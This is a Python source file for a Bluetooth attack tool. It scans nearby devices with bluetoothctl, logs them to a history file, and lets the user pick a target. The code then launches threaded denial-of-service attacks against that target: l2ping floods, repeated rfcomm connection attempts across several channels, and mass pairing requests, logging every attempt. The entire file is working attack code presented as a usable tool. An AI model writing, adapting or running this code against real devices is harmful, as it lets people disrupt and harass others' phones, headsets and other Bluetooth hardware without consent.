import os
import threading
import time
import subprocess
import re
from rich.table import Table
from colorama import Fore
import os
import csv
import signal
from datetime import datetime

class Bluetooth:
    def __init__(self, interface, console):
        self.console = console
        self.interface = interface

        subprocess.check_output("sudo service bluetooth stop", shell=True, stderr=subprocess.STDOUT, text=True)
        subprocess.check_output("sudo service bluetooth start", shell=True, stderr=subprocess.STDOUT, text=True)

        self.device_mac = []
        self.channels = [1, 2, 3, 4, 6, 8, 9, 10, 11]
        self.file_name = "history.csv"
        self.script_dir = os.path.dirname(os.path.abspath(__file__)) # this always will find the path of the project

        self.file_path = os.path.join(self.script_dir, self.file_name)

        self.file_data = []
        self.interrupted = False

        if not os.path.exists(self.file_path):
            with open(self.file_path, "w", newline='') as file:
                writer = csv.writer(file)

        self.log_file = os.path.join(self.script_dir, "attack_log.csv")

        # Create log file with headers if it doesn't exist
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w", newline='') as log:
                writer = csv.writer(log)
                writer.writerow(["Timestamp", "MAC", "Channel", "Attack Type", "Status"])
        
        signal.signal(signal.SIGINT, self._signal_handler)

    #########################################
    ############# The file part #############
    #########################################

    def _write_to_file(self, mac, name):
        with open(self.file_path, "a", newline='') as file:
            writer = csv.writer(file)
            writer.writerow([mac, name])
    
    def _read_file(self):
        self.file_data.clear()
        with open(self.file_path, "r", newline='') as file:
            reader = csv.reader(file)

            for row in reader:
                if len(row) == 2:
                    self.file_data.append(tuple(row))
    
    def _check_is_mac_exists(self,new_mac, new_name):
        self._read_file()

        existing_macs = [(mac,name) for mac, name in self.file_data]

        if (new_mac, new_name) not in existing_macs:
            self._write_to_file(new_mac, new_name)
    

    def _log_attack(self, mac, channel, attack_type, status):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a", newline='') as log:
            writer = csv.writer(log)
            writer.writerow([timestamp, mac, channel, attack_type, status])

    

    #########################################
    ########## The client scan part #########
    #########################################
    
    def _scan_devices(self, delay=5):
        """Scan for Bluetooth devices"""

        try:

            # Start bluetoothctl as an interactive process
            process = subprocess.Popen(
                ["bluetoothctl"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True
            )
    
            # Enable scanning
            process.stdin.write("scan on\n")
            process.stdin.flush()
            time.sleep(delay)  # Allow scan to collect results
    
            # Stop scanning
            process.stdin.write("scan off\n")
            process.stdin.flush()
            time.sleep(1)
    
            # Request list of discovered devices
            process.stdin.write("devices\n")
            process.stdin.flush()
    
            # Read and parse output (with timeout to prevent infinite loops)
            devices = []
            seen = set()
            start_time = time.time()
            while True:
                if time.time() - start_time > 3:  # Avoid infinite loop
                    break
                
                line = process.stdout.readline().strip()
                if not line:
                    continue  # Skip empty lines
                
                match = re.search(r"Device (([0-9A-F]{2}:){5}[0-9A-F]{2}) (.+)", line)

                if match:
                    mac = match.group(1)
                    if mac not in seen:
                        devices.append((mac, match.group(3)))
                        seen.add(mac)
                        self._check_is_mac_exists(mac, match.group(3))
    
            # Terminate process safely
            process.stdin.close()
            process.stdout.close()
            process.terminate()

        except Exception as e:
            print(f"[!] Error during scanning: {e}")
            devices = []

        return devices
    
    def display_devices(self):

        self.device_mac.clear()

        table = Table(title= "Scanned bluetooth devices")
        table.add_column("Index", justify="center", style="yellow")
        table.add_column("Client MAC", justify="left", style="cyan")
        table.add_column("Client name", justify="left", style="green")

        delay = input("Choose the scan time in seconds (default 5 sec): ")

        if not delay:
            devices = self._scan_devices()
        else:
            devices = self._scan_devices(int(delay))

        if not devices:
            table.add_row("0", "Null", "Null")
            return None
        else:
            for i, (mac, name) in enumerate(devices):
                table.add_row(str(i), mac, name)
                self.device_mac.append(mac)
            self.console.print(table)
        
        return self._choose_device()

    def _choose_device(self):
        print("\nChoose a device by index or press 'q' to exit\n")

        while True:
            
            choice = input(Fore.CYAN + "> " + Fore.RESET)

            if choice.lower() == "q":
                print("Goodbye!")
                return None

            if choice.isdigit():
                idx = int(choice)

                if 0 <= idx <len(self.device_mac):

                    selected_mac = self.device_mac[idx]
                    return selected_mac
                else:
                    print("Invalid index. Please try again.")
            else:
                print("Invalid input. Please enter a valid number or 'q'.")
    
    def display_devices_from_file(self):
        self.clear_bluetooth_data()

        self._read_file()

        table = Table(title= "Scanned bluetooth devices from history")
        table.add_column("Index", justify="center", style="yellow")
        table.add_column("Client MAC", justify="left", style="cyan")
        table.add_column("Client name", justify="left", style="green")

        for i, (mac, name) in enumerate(self.file_data):
                table.add_row(str(i), mac, name)
                self.device_mac.append(mac)

        self.console.print(table)

        return self._choose_device()
    

    #########################################
    ##########    The deauth part   #########
    #########################################

    def _l2ping_attack(self, packet_size, target_address):
        print(Fore.CYAN + "[+] Starting l2ping attack" + Fore.RESET)
        self._log_attack(target_address, "-", "l2ping", "Started")
    
        try:
            # Start l2ping as a subprocess so we can kill it later
            process = subprocess.Popen(
                ['l2ping', '-i', self.interface, '-s', str(packet_size), '-f', target_address],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    
            while not self.interrupted:
                if process.poll() is not None:  # Process finished
                    break
                time.sleep(0.2)
    
            if self.interrupted:
                process.terminate()
                self._log_attack(target_address, "-", "l2ping", "Terminated due to interrupt")
    
        except Exception as e:
            self._log_attack(target_address, "-", "l2ping", f"Error: {e}")
    

    def _rfcomm_attack(self, target, channel):
        print(Fore.CYAN + f"[+] Starting rfcomm attack on channel {channel} via {self.interface}" + Fore.RESET)
        self._log_attack(target, channel, "rfcomm", "Started")

        for i in range(100):
            if self.interrupted:
                break
            try:
                subprocess.run(
                    ['rfcomm', '-i', self.interface, 'connect', target, str(channel)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=5
                )
                self._log_attack(target, channel, "rfcomm", f"Attempt {i+1}: Success")
            except subprocess.CalledProcessError:
                self._log_attack(target, channel, "rfcomm", f"Attempt {i+1}: Failed")
            except subprocess.TimeoutExpired:
                self._log_attack(target, channel, "rfcomm", f"Attempt {i+1}: Timeout")
    
    
    def _pairing_attack(self, target):
        print(Fore.CYAN + "[+] Starting pairing attack" + Fore.RESET)
        self._log_attack(target, "-", "pair", "Started")

        for i in range(150):
            if self.interrupted:
                break
            else:
                try:
                    subprocess.run(["bluetoothctl"],
                                   input=f"pair {target}\n",
                                   text=True,
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL,
                                   timeout=3)
                    self._log_attack(target, "-", "pair", f"Attempt {i+1}: Sent")
                except subprocess.TimeoutExpired:
                    self._log_attack(target, "-", "pair", f"Attempt {i+1}: Timeout")
                except Exception as e:
                    self._log_attack(target, "-", "pair", f"Attempt {i+1}: Error {e}")


    def _combo_attack(self, target_address, channel):
        def _l2ping_thread():
            if self.interrupted: return
            self._l2ping_attack(600, target_address)

        def _rfcomm_thread():
            if self.interrupted: return
            self._rfcomm_attack(target_address, channel)

        def _pair_thread():
            if self.interrupted: return
            self._pairing_attack(target_address)

        t1 = threading.Thread(target=_l2ping_thread)
        t2 = threading.Thread(target=_rfcomm_thread)
        t3 = threading.Thread(target=_pair_thread)

        t1.start(); t2.start(); t3.start()

        while any(t.is_alive() for t in [t1, t2, t3]):
            try:
                time.sleep(0.5)
                if self.interrupted:
                    print(Fore.YELLOW + "[*] Interrupt flag detected. Waiting for threads to finish..." + Fore.RESET)
                    break
            except KeyboardInterrupt:
                break

        t1.join(); t2.join(); t3.join()
    
    def run_attack(self, target_address):
        threads = []

        for channel in self.channels:
            t = threading.Thread(target=self._combo_attack, args=(target_address, channel))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()
    
    def _signal_handler(self, signum, frame):
        print(Fore.RED + "\n[!] Signal received. Stopping attack..." + Fore.RESET)
        self._log_attack("ALL", "-", "global", "Interrupted by user")
        self.interrupted = True

    
    
    def clear_bluetooth_data(self):
        self.file_data.clear()
        self.device_mac.clear()